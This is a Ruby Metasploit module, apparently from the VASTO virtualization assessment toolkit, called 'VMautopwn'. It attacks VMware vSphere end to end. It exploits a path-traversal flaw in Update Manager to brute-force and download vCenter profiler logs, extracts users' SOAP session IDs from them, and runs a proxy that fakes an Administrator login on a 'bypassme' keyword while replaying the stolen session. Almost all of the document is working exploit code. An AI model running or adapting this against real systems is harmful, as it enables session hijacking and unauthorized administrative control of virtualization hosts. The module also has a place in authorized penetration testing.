#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################
require 'msf/core'
require "rexml/document"

class Metasploit3 < Msf::Auxiliary  
  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Rex::Socket::SslTcp
  include REXML

  
  def initialize
    super(
			'Name'        => 'VMautopwn',
			'Version'     => 'VMware Autopwn 0.9',
			'Description' => 'This module automatizes retrieving remote sessions from a 
					  VMware vSphere system combining
					  updatemanager traversal and session rider.',
			'Author'      => 'Claudio Criscione - c.criscione@securenetwork.it',
      			'References'	=>
				[
					[ 'URL', 'http://www.vmware.com/security/advisories/' ],
					[ 'CERT', '402580' ],	
					[ 'URL', 'http://jira.codehaus.org/browse/JETTY-1004' ]
				],
			'License'     =>  GPL_LICENSE 
    )
      
    deregister_options('VHOST')
    register_options(
      [
        Opt::RPORT(9084),
       #Higher is better, but guess what, it takes longer. 
        OptString.new('MAXLOGFILES',[true,"Maximum ID number to retrieve.",100]), 
        OptBool.new('SSL', [ true, "Use SSL", false ]),
	OptString.new('LOGDIR',[true,"Directory hosting the log files","ProgramData/VMware/VMware%20VirtualCenter/Logs"]),
	OptString.new('ESXPORT',[true,"Remote connection port. In most cases 443",443])
      ], self.class)    
  end

  
  
  def run_host(ip)
    begin
	maxlog = datastore['MAXLOGFILES']
	print_status("Will test up to #{maxlog} files, set MAXLOGFILES to override. Retrieving log files.")
	session = get_session(ip,maxlog)
	run_session_rider(session)
    end
  end
  


  #Getting the session ID out of the log file, bruteforcing the logfile name
  def get_session(ip,maxlog)
    maxlog = 100
    for i in 1..maxlog do
      begin
	  filename = datastore['LOGDIR'] + '/vpxd-profiler-'+"#{i}"+'.log'
	  file = do_file(ip,filename)
	  if(file)
	      print_status("Got it!!! vpxd-profiler-#{i}.log")
	      #Fetching temporary directory to parse the file since we have no output
	      require 'tmpdir'
	      ldir = Dir.tmpdir + "/"
	      #Writing the file content
	      f = File.open(ldir+"vpxd-profiler-#{i}.log", "w")
	      f.write(file)
	      break
	  end
	rescue  Errno::ECONNREFUSED,::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::OpenURI::HTTPError
	rescue ::Timeout::Error, ::Errno::EPIPE
	end
    end
    
    session  = parse_session_file(ldir+"vpxd-profiler-#{i}.log")
    print_status("Last session found: #{session}")
    return session
  end
  
  
    #Here we parse a session file to extract the latest SOAPID
    def parse_session_file(filepath)
      print_status("Parsing #{filepath}")
      stolenid = "notfound"
      readfile = File.new(filepath, "r")   
      regex = Regexp.new(/Session\/.*SoapSession\/Id='(.*)'/)
      while (line = readfile.gets)
	    matchdata = regex.match(line)
	    if matchdata 
	      stolenid = matchdata[1]
	      userregex = Regexp.new(/Username='(.*)'\/Client/)
	      matchusername = userregex.match(line)
	      username = matchusername[1]
	      if(username!='')
		print_status("Session for user #{username} found. SOAPID : #{stolenid}")
	      end
	    end
      end
      readfile.close
      return stolenid
    end
    
   
   #retrieves a given file
   def do_file(ip,file)
     begin
	
	baseuri = "/vci/downloads/health.xml/%3F/../../../../../../../../../"
	uri = baseuri + file	
	
	
	  begin
	  res = send_request_cgi({
		  'uri'     =>  "#{uri}",
		  'method'  => 'GET',
		  }, 25)
	  
	  unless (res.kind_of? Rex::Proto::Http::Response)
		  print_status("Remote update manager is not responding")
		  return false
	  end
	  
	  return false if (res.code == 404)
	  srvhdr = res.headers['Server']
	  if res.code == 200
	      return res.body
	  end

	  rescue ::Rex::ConnectionError => e
		  print_status("Connection error - #{e}")
		  return false
	  end
	rescue ::OpenSSL::SSL::SSLError
	rescue ::Timeout::Error, ::Errno::EPIPE    
     end
   end
   
   
    
      def run_session_rider(session)
	      @myhost   = datastore['SRVHOST']
	      @payload  = datastore['PAYLOAD']
	      @RHOST = datastore['RHOST']
	      datastore['SSL'] = true; #We have to use SSL from now on
	      datastore['RPORT'] = datastore['ESXPORT']
	      @RPORT = datastore['RPORT']
	      @myport = datastore['SRVPORT']
	      @firstreq = true #This is a flag to track wheter we have provided the authentication or not
	      @loggedin = false #This is a flag to track if we have already gone through login
	      exploit()	
      end
      
      
      def on_client_connect(c)		
	      c.extend(Rex::Proto::Http::ServerClient)
	      c.init_cli(self)
	      print_status("Detected client connection.")
      end
      
      def on_client_data(cli)
	      begin
		      data = cli.get_once(-1, 5)
		      raise ::Errno::ECONNABORTED if !data or data.length == 0
		      case cli.request.parse(data)
			      when Rex::Proto::Http::Packet::ParseCode::Completed
				      dispatch_request(cli, cli.request)
				      cli.reset_cli
			      when  Rex::Proto::Http::Packet::ParseCode::Error
				      close_client(cli)
		      end
	      rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
	      rescue ::OpenSSL::SSL::SSLError
	      rescue ::Exception
		      print_status("VMware Session Rider - Error: #{$!.class} #{$!} #{$!.backtrace}")
	      end
      end

      def close_client(cli)
	      cli.close
	      # Required to clean up the service properly
	      raise ::EOFError
      end
      
      
      def dispatch_request(cli, req)	
	      phost = cli.peerhost
	      mysrc = Rex::Socket.source_address(cli.peerhost)
	      hhead = (req['Host'] || @myhost).split(':', 2)[0]
	      
	      @body = req.body		
	      @ans = ""
	      
	      #Here we handle GET requests
	      if(req.method == "GET")
		res = send_request_raw( { 'uri'     => req.resource})
		@ans  = 
		      "HTTP/1.1 200 OK\r\n" +
		      "Host: #{mysrc}\r\n" +
		      "Expires: 0\r\n" +
		      "Content-Type: text/xml\r\n" +
		      "Content-Length: #{res.body.length}\r\n" +
		      "\r\n#{res.body}"
		  cli.put(@ans)
	      else
		if(@firstreq) #This is the first request so we acquire a SOAPID from the server
		  #This is necessary because the VCenter will not let us use the stolen SOAPID pre-auth
		  print_status("VMware Session Rider - Executing first request to retrieve SOAPID")
		  res = send_request_raw( {
			    'uri'     => req.resource,
			    'method'  => req.method,
			    'vhost'   => @RHOST,
			    'data'    => req.body,
			    'read_max_data' => (1024*1024*10),
			    'headers' => {
				    'User-Agent'      => 'VMware VI Client',
				    'Content-Length'  => req.body.length,
				    'SOAPAction'      => "\"#{req.headers['SOAPAction']}\"",
				    'Expect'          => '100-continue',
				    'Content-Type'    => 'text/xml; charset=\"UTF-8\"',
			    }
		  }, -1)
		  @ans  = 
			"HTTP/1.1 200 OK\r\n" +
			"Host: #{mysrc}:#{@myport}\r\n" +
			"Cache-Control: no-cache\r\n" +
			"Content-Type: text/xml\r\n" +
			"Set-Cookie: #{res.headers['Set-Cookie']}\r\n" + 
			"Content-Length: #{res.body.length}\r\n" +
			"\r\n#{res.body}"
		  @firstreq = false #ok, we have got the soapid now
		  cli.put(@ans)
		else #This is not the first request, so we handle it 
		  
		  if(@loggedin) #If we are logged in we can start using the stolensoapid!
		      @currentsoapid = "vmware_soap_session=#{@STOLENSOAPID};"
		  else
		      @currentsoapid = req.headers['Cookie']
		  end

		  
		  if(req.body.match(/bypassme/)) then #Performing fake login, so we don't need valid credentials!
		    print_status("Keyword bypassme found in stream. Executing fake login now!")
		    fakeanswer = '<?xml version="1.0" encoding="UTF-8"?>'+
		    '<soapenv:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" '+
		    'xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '+
		    'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '+
		    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> '+
		    '<soapenv:Body>'+
		    '<LoginResponse xmlns="urn:internalvim25"><returnval><key>605E3B6C-8832-4DDD-A1AE-68753C1412BB</key><userName>Administrator</userName><fullName></fullName><loginTime>2010-06-19T08:38:18.263415Z</loginTime><lastActiveTime>2010-06-19T08:38:18.263415Z</lastActiveTime><locale>en_US</locale><messageLocale>en</messageLocale></returnval></LoginResponse>'+
		    '</soapenv:Body>'+
		    '</soapenv:Envelope>'
		    @ans  = 
			  "HTTP/1.1 200 OK\r\n" +
			  "Host: #{mysrc}:#{@myport}\r\n" +
			  "Cache-Control: no-cache\r\n" +
			  "Content-Type: text/xml\r\n" +
			  "Content-Length: #{fakeanswer.length}\r\n" +
			  "\r\n#{fakeanswer}"
		    @loggedin = true
		    cli.put(@ans)
		  else 		    		
		    @datareq = req.body #We turn as-is what the client requests
		    
		    request = "POST /sdk HTTP/1.1\r\n"+
		    "Host: #{@RHOST}:#{@RPORT}\r\n"+
		    "User-Agent: VMware VI Client/4.0.0\r\n"+
		    "SOAPAction: #{req.headers['SOAPAction']}\r\n"+
		    "Content-Length: #{@datareq.length}\r\n"+
		    "Content-Type : text/xml; charset=\"UTF-8\"\r\n"+
		    "Cookie: #{@currentsoapid}\r\n\r\n#{@datareq}"
		    
		    #We use sockets here due to some size issues with the SSL HTTP meshup
		    socket_to_vcenter = Rex::Socket::SslTcp.create(
			      'PeerHost' => @RHOST,
			      'PeerPort' => @RPORT)
		    begin 
		      timeout(3) do
		      socket_to_vcenter.put(request) #We submit the request
		      res_with_headers = socket_to_vcenter.get() #We get the answer
		      #We now have to extract the body from the headers
		      @ans = res_with_headers
		      socket_to_vcenter.close
		      cli.put(@ans)
		      close_client(cli)
		    end
		    rescue Timeout::Error
		      #Timeouts will happen if there are no updates
		      close_client(cli)
		      socket_to_vcenter.close
		    end
		  end
		end
	      end
	    return		
      end	
   
end
